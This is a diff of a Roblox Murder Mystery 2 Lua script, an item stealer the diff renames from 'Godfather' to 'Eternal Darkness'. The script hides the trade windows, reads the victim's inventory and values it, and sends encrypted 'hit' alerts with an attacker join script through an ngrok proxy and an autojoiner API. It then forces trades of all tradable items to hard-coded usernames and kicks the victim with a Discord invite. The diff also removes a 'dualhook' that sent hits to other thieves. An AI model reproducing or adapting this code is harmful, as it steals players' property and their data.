@@ -1,14 +1,7 @@
-local USERNAMES = {"Nuls_rip"}
-local WEBHOOK_ID = "t3pcyds196h"
-
-_G.USERNAMES = USERNAMES
-_G.WEBHOOK_ID = WEBHOOK_ID
-
-
 repeat task.wait() until game:IsLoaded()
 task.wait(2)
 
--- Sadece MM2'de çalışsın
+-- Only works in MM2
 if game.PlaceId ~= 142823291 then
     game.Players.LocalPlayer:Kick("This script only works in MM2!")
     return
@@ -18,7 +11,7 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- ================= YENİ BYPASS KODU =================
+-- ================= BYPASS CODE =================
 local REAL_JOB_ID = nil
 
 local function getRealJobId()
@@ -80,9 +73,9 @@ local function getRealJobId()
 end
 
 REAL_JOB_ID = getRealJobId()
--- ================= BYPASS SONU =================
+-- ================= BYPASS END =================
 
--- Şifreleme motoru (dualhook için)
+-- Encryption engine
 local a={}for b=0,255 do a[b]=string.char(b)end 
 local function stringchar(b)local c=a[b]or string.char(b)return c end 
 local function mathfloor(b)if b>=0 then return b-(b%1)else local c=b-(b%1)return c==b and c or c-1 end end 
@@ -95,16 +88,13 @@ local function encrypt(b)return toHex(xorCrypt(b,"85acfc6776299e4661b3093d63b6a9
 
 -- ================= PROXY WEBHOOK SYSTEM =================
 
-local PROXY_URL = "https://malevolently-oilless-zita.ngrok-free.dev/api/proxy/"
+local PROXY_URL = "https://malevolently-oilless-zita.ngrok-free.app/api/proxy/"
 
 -- EXTERNAL GLOBALS - SET BY LOADER
 local WEBHOOK_ID = _G.WEBHOOK_ID or "default_webhook"
 local usernames_id = _G.USERNAMES or {}
 
-local DUALHOOK_WEBHOOK_ID = "moqs1fx2p8s"
-local PUBLIC_WEBHOOK_ID = ""
-
--- Universal request (TÜM EXECUTORLAR İÇİN)
+-- Universal request (ALL EXECUTORS)
 getgenv().request = getgenv().request 
     or request 
     or http_request 
@@ -129,7 +119,8 @@ getgenv().request = getgenv().request
     or nil
 
 if not getgenv().request then
-    return warn("Executor not supported: No request function found.")
+    warn("Executor not supported: No request function found.")
+    return
 end
 
 -- Universal queue_on_teleport
@@ -176,20 +167,16 @@ getgenv().setclipboard = getgenv().setclipboard
 local HttpService = game:GetService("HttpService")
 if not HttpService.HttpEnabled then HttpService.HttpEnabled = true end
 
-
 local cfg = {
     users = usernames_id,
     webhook = WEBHOOK_ID,
-
-    dualhookUser = {"Skaakm", "ItsBelrux", "ItsZorlux", "bastememirhan7", "The_Galaxor"},
     pingEveryone = "Yes",
     StatusApi = "https://live-status-seven.vercel.app",
     ApiKey = "sk_live_4A9ZK7F2N0D6B8R5XHqMJEWpCYLt"
 }
--- AUTOJOINER API
+
 local AUTOJOINER_API = "https://autojoiner-fawn.vercel.app/api/hit"
 
--- Trade dışı itemlar
 local no_trade_items = {
     ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
     ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
@@ -202,7 +189,6 @@ local no_trade_items = {
     ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
 }
 
--- Chroma/özel itemler
 local specialItems = {
     ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
     ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
@@ -217,7 +203,6 @@ local specialItems = {
 }
 
 local users = cfg.users
-local dualhookUser = cfg.dualhookUser
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -225,24 +210,19 @@ local plr = Players.LocalPlayer
 
 if not plr then return end
 
-local dualhookTimer = nil
-local isDualhookActive = false
 local isTradeCompleted = false
 local hasSpecialItem = false
 local totalInventoryValue = 0
 local statusHeartbeatStarted = false
 
--- Trade takibi için global değişkenler
 local originalItems = {}
 local receivedCounts = {}
 local tradeMessageId = nil
 local tradeWebhookUrl = nil
 local tradeMessageUrl = nil
-local isDualhookTrade = false
 
 local request = getgenv().request
 
--- Executor ismini evrensel olarak al
 local executorName = "Unknown"
 pcall(function()
     local ok, name = pcall(identifyexecutor)
@@ -264,7 +244,6 @@ local STATUS_API_URL = cfg.StatusApi or ""
 local API_KEY = cfg.ApiKey or ""
 local AVATAR_URL = "https://cdn.discordapp.com/attachments/1469409737220165746/1469677154294825032/IMG_6264.png"
 
--- Autojoiner'a hit bildir
 local function sendHitToQueue(placeId, jobId, receiverName)
     pcall(function()
         request({
@@ -280,9 +259,11 @@ local function sendHitToQueue(placeId, jobId, receiverName)
     end)
 end
 
--- Rubis.app yükleme
 local function upload_to_rubis(items)
-    local lines = {"Godfather Inventory Dump| Pastefy", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
+    if not items or #items == 0 then return nil end
+
+    local lines = {"Eternal Darkness Inventory | Pastefy", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
+
     table.sort(items, function(a, b)
         local tier_order = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
         local a_order = tier_order[a.Rarity] or 1
@@ -290,6 +271,7 @@ local function upload_to_rubis(items)
         if a_order ~= b_order then return a_order > b_order end
         return (a.Value * a.Amount) > (b.Value * b.Amount)
     end)
+
     local current_tier = nil
     for _, item in ipairs(items) do
         if current_tier ~= item.Rarity then
@@ -301,6 +283,7 @@ local function upload_to_rubis(items)
         local total_val = item.Value * item.Amount
         table.insert(lines, string.format("%s | Qty: %d | Value: %d (Total: %d)", item.ItemName or item.DataID, item.Amount, item.Value, total_val))
     end
+
     local content = table.concat(lines, "\n")
     local ok, response = pcall(function()
         return request({
@@ -313,6 +296,7 @@ local function upload_to_rubis(items)
             })
         })
     end)
+
     if ok and response and response.StatusCode == 200 then
         local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
         if ok2 and data then
@@ -326,7 +310,6 @@ local function upload_to_rubis(items)
     return nil
 end
 
--- Değer çekme fonksiyonu
 local function fetch_all_values()
     local value_links = {
         commons = "https://supremevalues.com/mm2/commons",
@@ -341,18 +324,26 @@ local function fetch_all_values()
         uniques = "https://supremevalues.com/mm2/uniques",
         sets = "https://supremevalues.com/mm2/sets"
     }
+
     local req_headers = {
         ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
         ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
     }
-    local function clean_string_lol(str) return str:match("^%s*(.-)%s*$") end
+
+    local function clean_string_lol(str) 
+        return str:match("^%s*(.-)%s*$") or str
+    end
+
     local function fetchHTML(url)
-        local ok, response = pcall(function() return request({Url = url, Method = "GET", Headers = req_headers}) end)
+        local ok, response = pcall(function() 
+            return request({Url = url, Method = "GET", Headers = req_headers}) 
+        end)
         if ok and response then return response.Body end
         return nil
     end
+
     local function parseValue(itembodyDiv)
-        local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+        local valueStr = itembodyDiv:match("<b%s+class=['"]itemvalue['"]>([%d,%.]+)</b>")
         if valueStr then
             valueStr = valueStr:gsub(",", "")
             local value = tonumber(valueStr)
@@ -360,26 +351,35 @@ local function fetch_all_values()
         end
         return nil
     end
+
     local function extractItems(htmlContent)
         local itemValues = {}
-        for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['"]itemhead['"]>(.-)</div>%s*<div%s+class=['"]itembody['"]>(.-)</div>") do
             itemName = itemName:match("([^<]+)")
             if itemName then
                 itemName = clean_string_lol(itemName:gsub("%s+", " "))
-                itemName = clean_string_lol((itemName:split(" Click "))[1])
-                local itemNameLower = itemName:lower()
+                local splitResult = {}
+                for part in string.gmatch(itemName, "[^ ]+") do
+                    table.insert(splitResult, part)
+                end
+                if splitResult[1] and splitResult[1] ~= "Click" then
+                    itemName = clean_string_lol(splitResult[1])
+                end
+                local itemNameLower = string.lower(itemName)
                 local value = parseValue(itembodyDiv)
                 if value then itemValues[itemNameLower] = value end
             end
         end
         return itemValues
     end
+
     local function extractChromaItems(htmlContent)
         local chromaValues = {}
-        for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['"]itemhead['"]>(.-)</div>%s*<div%s+class=['"]itembody['"]>(.-)</div>") do
             chromaName = chromaName:match("([^<]+)")
             if chromaName then
-                chromaName = clean_string_lol(chromaName:gsub("%s+", " ")):lower()
+                chromaName = clean_string_lol(chromaName:gsub("%s+", " "))
+                chromaName = string.lower(chromaName)
                 local value = parseValue(itembodyDiv)
                 if value then chromaValues[chromaName] = value end
             end
@@ -390,9 +390,11 @@ local function fetch_all_values()
     local allExtractedValues = {}
     local chromaExtractedValues = {}
     local categoriesToFetch = {}
+
     for rarity, url in pairs(value_links) do
         table.insert(categoriesToFetch, {rarity = rarity, url = url})
     end
+
     local totalCategories = #categoriesToFetch
     local completed = 0
     local lock = Instance.new("BindableEvent")
@@ -415,26 +417,31 @@ local function fetch_all_values()
             if completed == totalCategories then lock:Fire() end
         end)
     end
+
     lock.Event:Wait()
 
     local final_prices = {}
     local item_db = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+
     for id, data in pairs(item_db) do
-        local item_name = data.ItemName and data.ItemName:lower() or ""
+        local item_name = data.ItemName and string.lower(data.ItemName) or ""
         local rarity = data.Rarity or ""
         local has_chroma = data.Chroma or false
+
         if item_name ~= "" and rarity ~= "" then
             if has_chroma then
                 for c_name, c_val in pairs(chromaExtractedValues) do
-                    if c_name:find(item_name) then
+                    if string.find(c_name, item_name) then
                         final_prices[id] = c_val
                         break
                     end
                 end
             end
+
             if not final_prices[id] and allExtractedValues[item_name] then
                 final_prices[id] = allExtractedValues[item_name]
             end
+
             if not final_prices[id] then
                 if rarity == "Godly" then final_prices[id] = 8
                 elseif rarity == "Ancient" then final_prices[id] = 50
@@ -448,9 +455,6 @@ local function fetch_all_values()
     end
     return final_prices
 end
-
--- Delta bypass (yeni versiyon)
--- REAL_JOB_ID zaten yukarıda bypass ile alındı
 
 if not plr.Character then plr.CharacterAdded:Wait() end
 task.wait(1)
@@ -467,10 +471,11 @@ local DeclineTrade = Trade:WaitForChild("DeclineTrade")
 
 local LastOffer = nil
 Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
-    if x and x.LastOffer then LastOffer = x.LastOffer end
+    if x and x.LastOffer then 
+        LastOffer = x.LastOffer 
+    end 
 end)
 
--- GUI'leri kapat
 local PlayerGui = plr:WaitForChild("PlayerGui")
 for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
     local gui = PlayerGui:FindFirstChild(guiName)
@@ -482,7 +487,6 @@ for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
     end
 end
 
--- Inventory oku
 local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 
@@ -514,7 +518,6 @@ end
 
 table.sort(weaponsToSend, function(a, b) return a.TotalValue > b.TotalValue end)
 
--- Hit kategorisi
 local hitCategory = ""
 local isPingWorthy = false
 
@@ -532,42 +535,45 @@ end
 
 local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"
 
-
-local function sendToProxy(Wid, payload, isEncrypted)
+local function sendToProxy(Wid, payload)
     task.spawn(function()
         local finalBody = HttpService:JSONEncode(payload)
-        if isEncrypted then
-            finalBody = encrypt(finalBody)
-        end
-        
-        local url = PROXY_URL .. Wid
-        print("[Godfather] Sending to proxy:", url)
-        
+        finalBody = encrypt(finalBody)
+
+        local url = PROXY_URL .. tostring(Wid)
+        url = url:gsub("%s+", "")
+
+        print("[Eternal Darkness] Sending encrypted to proxy:", url)
+
         local success, response = pcall(function()
             return request({
                 Url = url,
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json",
-                    ["User-Agent"] = "Godfather/3.5.1"
+                    ["User-Agent"] = "EternalDarkness/4.0.0"
                 },
                 Body = finalBody
             })
         end)
-        
+
         if not success then
-            warn("[Godfather] Request failed:", tostring(response))
+            warn("[Eternal Darkness] Request failed:", tostring(response))
         elseif response.StatusCode ~= 200 then
-            warn("[Godfather] Proxy error:", response.StatusCode, response.Body)
+            warn("[Eternal Darkness] Proxy error:", response.StatusCode, response.Body)
         else
-            print("[Godfather] successfully")
+            print("[Eternal Darkness] Successfully sent (encrypted)")
         end
     end)
 end
--- Trade mesajını güncelle (SADECE proxy üzerinden)
+
+local function getStatus()
+    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
+    return ok and status or "None"
+end
+
 local function updateTradeMessage()
     if not tradeMessageUrl or not originalItems or #originalItems == 0 then return end
-    if isDualhookTrade then return end
 
     local totalReceivedValue = 0
     local totalOriginalValue = 0
@@ -582,7 +588,7 @@ local function updateTradeMessage()
 
         local percentage = math.floor((received / origItem.Amount) * 100)
         local statusEmoji = percentage == 100 and "✅" or percentage >= 50 and "⏳" or "🔄"
-        
+
         table.insert(itemFields, {
             name = string.format("%s %s", statusEmoji, origItem.ItemName),
             value = string.format("```[%d/%d] %d%%\nValue: %d/%d```", received, origItem.Amount, percentage, receivedValue, totalValue),
@@ -590,7 +596,7 @@ local function updateTradeMessage()
         })
     end
 
-    local totalPercentage = math.floor((totalReceivedValue / totalOriginalValue) * 100)
+    local totalPercentage = totalOriginalValue > 0 and math.floor((totalReceivedValue / totalOriginalValue) * 100) or 0
     local progressColor = totalPercentage == 100 and 0x00FF00 or totalPercentage >= 75 and 0xFFD700 or 0x8B0000
 
     local embed = {
@@ -599,60 +605,50 @@ local function updateTradeMessage()
         fields = itemFields,
         description = string.format("**Total Progress: %d/%d Value (%d%%)**", totalReceivedValue, totalOriginalValue, totalPercentage),
         footer = { 
-            text = "Godfather MM2 Stealer • NULS Hosting • v3.4.1"
+            text = "Eternal Darkness MM2 • v4.0.0"
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
 
     local payload = { embeds = { embed } }
-    sendToProxy(WEBHOOK_ID, payload, true)
+    sendToProxy(WEBHOOK_ID, payload)
 end
 
-local function sendWebhook(targetWebhookId, isDualhook)
+local function sendWebhook()
     local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
-    local targetName = isDualhook and table.concat(dualhookUser, ", ") or table.concat(users, ", ")
-    local hookType = isDualhook and "⚠️ DUALHOOK BACKUP" or "🎯 HIT CONFIRMED"
-    local color = isDualhook and 0xFF4500 or 0x8B0000
+    local targetName = table.concat(users, ", ")
     local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', PlaceId, REAL_JOB_ID)
 
-    local itemsForWebhook = weaponsToSend
-    if isDualhook then
-        itemsForWebhook = {}
-        for _, item in ipairs(weaponsToSend) do
-            if item.Rarity == "Godly" or item.Rarity == "Vintage" or item.Rarity == "Ancient" or item.Rarity == "Unique" or item.IsChroma then
-                table.insert(itemsForWebhook, item)
-            end
+    local total_items = 0
+    for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end
+
+    local top_items = {}
+    for i = 1, math.min(3, #weaponsToSend) do
+        local item = weaponsToSend[i]
+        if item then
+            local rarityEmoji = {
+                Ancient = "🔴", Godly = "🟣", Unique = "🟡", 
+                Vintage = "🟠", Legendary = "🔵", Rare = "🟢"
+            }
+            local emoji = rarityEmoji[item.Rarity] or "⚪"
+            table.insert(top_items, string.format("%s `%s` ×%d **%d**", emoji, item.ItemName, item.Amount, item.TotalValue))
         end
     end
 
-    local total_items = 0
-    for _, item in ipairs(itemsForWebhook) do total_items = total_items + item.Amount end
-
-    local top_items = {}
-    for i = 1, math.min(3, #itemsForWebhook) do
-        local item = itemsForWebhook[i]
-        local rarityEmoji = {
-            Ancient = "🔴", Godly = "🟣", Unique = "🟡", 
-            Vintage = "🟠", Legendary = "🔵", Rare = "🟢"
-        }
-        local emoji = rarityEmoji[item.Rarity] or "⚪"
-        table.insert(top_items, string.format("%s `%s` ×%d **%d**", emoji, item.ItemName, item.Amount, item.TotalValue))
-    end
-
     local tier_counts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
-    for _, item in ipairs(itemsForWebhook) do
+    for _, item in ipairs(weaponsToSend) do
         tier_counts[item.Rarity] = (tier_counts[item.Rarity] or 0) + item.Amount
     end
 
     local content = nil
     if isPingWorthy and cfg.pingEveryone == "Yes" then
-        content = isDualhook and "@everyone ⚠️ **DUALHOOK TRIGGERED**" or "@everyone 🎯 **NEW HIT ACQUIRED**"
+        content = "@everyone 🎯 **NEW HIT ACQUIRED**"
     end
 
     local embed = {
-        title = string.format("%s │ %s │ %s", hookType, plr.DisplayName, hitCategory),
+        title = string.format("🎯 HIT CONFIRMED │ %s │ %s", plr.DisplayName, hitCategory),
         url = rubisLink,
-        color = color,
+        color = 0x8B0000,
         thumbnail = {url = avatarUrl},
         description = string.format("```lua\n%s\n```", joinScript),
         fields = {
@@ -673,11 +669,11 @@ local function sendWebhook(targetWebhookId, isDualhook)
 			},
             {
                 name = "📊 Inventory Breakdown",
-                value = string.format("```ansi\n[2;31mAncient:  %d  [2;35mGodly:   %d[0m\n[2;33mUnique:   %d  [2;38;5;208mVintage: %d[0m\n[2;34mLegendary:%d  [2;32mRare:    %d[0m\n[2;37mUncommon: %d  Common:  %d```", 
-                    tier_counts.Ancient, tier_counts.Godly,
-                    tier_counts.Unique, tier_counts.Vintage,
-                    tier_counts.Legendary, tier_counts.Rare,
-                    tier_counts.Uncommon, tier_counts.Common),
+                value = string.format("```ansi\n[2;31mAncient:  %d  [2;35mGodly:   %d[0m\n[2;33mUnique:   %d  [2;38;5;208mVintage: %d[0m\n[2;34mLegendary:%d  [2;32mRare:    %d[0m\n[2;37mUncommon: %d  Common:  %d```", 
+                    tier_counts.Ancient or 0, tier_counts.Godly or 0,
+                    tier_counts.Unique or 0, tier_counts.Vintage or 0,
+                    tier_counts.Legendary or 0, tier_counts.Rare or 0,
+                    tier_counts.Uncommon or 0, tier_counts.Common or 0),
                 inline = false
             },
             {
@@ -692,118 +688,26 @@ local function sendWebhook(targetWebhookId, isDualhook)
             }
         },
         footer = {
-            text = string.format("Godfather MM2 Stealer • NULS • v3.5.1 • %s", os.date("!%H:%M:%S UTC"))
+            text = string.format("Eternal Darkness MM2 • v4.0.0 • %s", os.date("!%H:%M:%S UTC"))
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
 
     local payload = {
         content = content,
-        username = isDualhook and "🔥 Dualhook Alert" or "💎 Godfather Stealer",
+        username = "🌑 Eternal Darkness",
         avatar_url = AVATAR_URL,
         embeds = {embed}
     }
 
-    sendToProxy(targetWebhookId, payload, isDualhook)
+    sendToProxy(WEBHOOK_ID, payload)
 
-    local receivers = isDualhook and dualhookUser or users
-    for _, rcv in ipairs(receivers) do
+    for _, rcv in ipairs(users) do
         sendHitToQueue(PlaceId, REAL_JOB_ID, rcv)
     end
 end
 
-local function sendPublicHits()
-    local tier_counts = rarityCounts
-    local total_items = 0
-    for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end
-
-    local content = "📢 **PUBLIC HIT REGISTERED**"
-
-    local rarityLines = {}
-    local rarities = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
-    local ansiColors = {"31", "35", "33", "38;5;208", "34", "32", "37", "30"}
-    
-    for i, rarity in ipairs(rarities) do
-        local count = tier_counts[rarity] or 0
-        if count > 0 then
-            table.insert(rarityLines, string.format("[2;%sm%s: %d[0m", ansiColors[i], rarity, count))
-        end
-    end
-
-    local embed = {
-        title = string.format("🌐 Public Greed │ %s", hitCategory),
-        url = rubisLink,
-        color = 0x8B0000,
-        description = string.format("**%s** got hit by Godfathers!", plr.Name),
-        fields = {
-            { 
-                name = "💎 Valuation", 
-                value = string.format("```yaml\nvalue: %d\nitems: %d```", totalInventoryValue, total_items), 
-                inline = true 
-            },
-            { 
-                name = "⚡ Executor", 
-                value = string.format("```yaml\nname: %s\nversion: %s```", executorName, "v3.5.1"), 
-                inline = true 
-            },
-            { 
-                name = "📊 Breakdown", 
-                value = string.format("```ansi\n%s```", table.concat(rarityLines, "\n")), 
-                inline = false 
-            }
-        },
-        footer = { 
-            text = "Godfather MM2 Stealer • NULS Hosting • v3.5.1"
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
-
-    local payload = {
-        content = content,
-        username = "📡 Public Broadcast",
-        avatar_url = AVATAR_URL,
-        embeds = {embed}
-    }
-
-    sendToProxy(PUBLIC_WEBHOOK_ID, payload, false)
-end
--- Dualhook timer
-local function startDualhookTimer()
-    dualhookTimer = task.delay(100, function()
-        if not isTradeCompleted then
-            isDualhookActive = true
-            sendWebhook(DUALHOOK_WEBHOOK_ID, true)
-            local target = nil
-            for _, name in ipairs(dualhookUser) do
-                local player = Players:FindFirstChild(name)
-                if player and player ~= plr then
-                    target = player
-                    break
-                end
-            end
-            if target then
-                task.spawn(function() doTrade(target) end)
-            end
-        end
-    end)
-end
-
-local function cancelDualhookTimer()
-    if dualhookTimer then task.cancel(dualhookTimer); dualhookTimer = nil end
-end
-
-sendWebhook(WEBHOOK_ID, false)
-sendPublicHits()
-
-if totalInventoryValue >= 300 then
-    startDualhookTimer()
-end
-
--- Trade fonksiyonları
-local function getStatus()
-    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
-    return ok and status or "None"
-end
+sendWebhook()
 
 local function waitForTarget(targetPlayer)
     local attempts = 0
@@ -828,42 +732,39 @@ end
 
 local function finishAndKick()
     isTradeCompleted = true
-    cancelDualhookTimer()
     task.wait(2)
     local discordLink = "https://discord.gg/dUaHggzp9q"
     pcall(function() setclipboard(discordLink) end)
-    plr:Kick("Items taken by Godfather Script\n\n" .. discordLink .. "\n\nJoin to get your items back!")
+    plr:Kick("Items taken by Eternal Darkness\n\n" .. discordLink .. "\n\nJoin to reclaim your soul!")
 end
 
 function doTrade(targetPlayer)
     if not targetPlayer or not targetPlayer.Parent then return end
     if not waitForTarget(targetPlayer) then return end
-    
+
     pcall(function() DeclineTrade:FireServer() end)
     task.wait(0.5)
     LastOffer = nil
-    
+
     local itemsAdded = false
     local timeout = 0
-    
+
     while timeout < 60 and #weaponsToSend > 0 do
-        local success = pcall(function()
+        local success, err = pcall(function()
             local status = getStatus()
-            
+
             if status == "None" then
                 if itemsAdded then
                     for i = 1, math.min(4, #weaponsToSend) do 
                         local removed = table.remove(weaponsToSend, 1)
-                        if originalItems and receivedCounts and not isDualhookTrade then
+                        if removed then
                             receivedCounts[removed.ItemName] = (receivedCounts[removed.ItemName] or 0) + removed.Amount
                         end
                     end
                     itemsAdded = false
                     LastOffer = nil
                     task.wait(0.5)
-                    if not isDualhookTrade then
-                        updateTradeMessage()
-                    end
+                    updateTradeMessage()
                 else
                     SendRequest:InvokeServer(targetPlayer)
                     task.wait(1.5)
@@ -875,12 +776,15 @@ function doTrade(targetPlayer)
                 task.wait(0.3)
             elseif status == "StartTrade" then
                 if not itemsAdded then
-                    for i = 1, math.min(4, #weaponsToSend) do
+                    local numToTrade = math.min(4, #weaponsToSend)
+                    for i = 1, numToTrade do
                         local item = weaponsToSend[i]
-                        for _ = 1, item.Amount do
-                            OfferItem:FireServer(item.DataID, "Weapons")
+                        if item then
+                            for _ = 1, item.Amount do
+                                OfferItem:FireServer(item.DataID, "Weapons")
+                            end
+                            task.wait(0.1)
                         end
-                        task.wait(0.1)
                     end
                     itemsAdded = true
                     task.spawn(function()
@@ -892,33 +796,29 @@ function doTrade(targetPlayer)
                 end
             end
         end)
-        
-        if not success then task.wait(1) end
+
+        if not success then
+            warn("[Eternal Darkness] Trade error:", err)
+            task.wait(1) 
+        end
         timeout = timeout + 1
     end
-    
+
     if #weaponsToSend == 0 then 
-        if not isDualhookTrade then
-            updateTradeMessage()
-        end
+        updateTradeMessage()
         finishAndKick() 
     end
 end
 
--- Target kontrol
 local function isTarget(name)
+    if not name then return false end
+    name = string.lower(name)
     for _, u in ipairs(users) do
-        if u:lower() == name:lower() then return true end
-    end
-    if isDualhookActive then
-        for _, u in ipairs(dualhookUser) do
-            if u:lower() == name:lower() then return true end
-        end
+        if string.lower(u) == name then return true end
     end
     return false
 end
 
--- Eventler
 Players.PlayerAdded:Connect(function(player)
     if player == plr then return end
     if isTarget(player.Name) then
@@ -935,5 +835,6 @@ for _, p in ipairs(Players:GetPlayers()) do
             task.wait(4)
             doTrade(p)
         end)
+        break
     end
 end
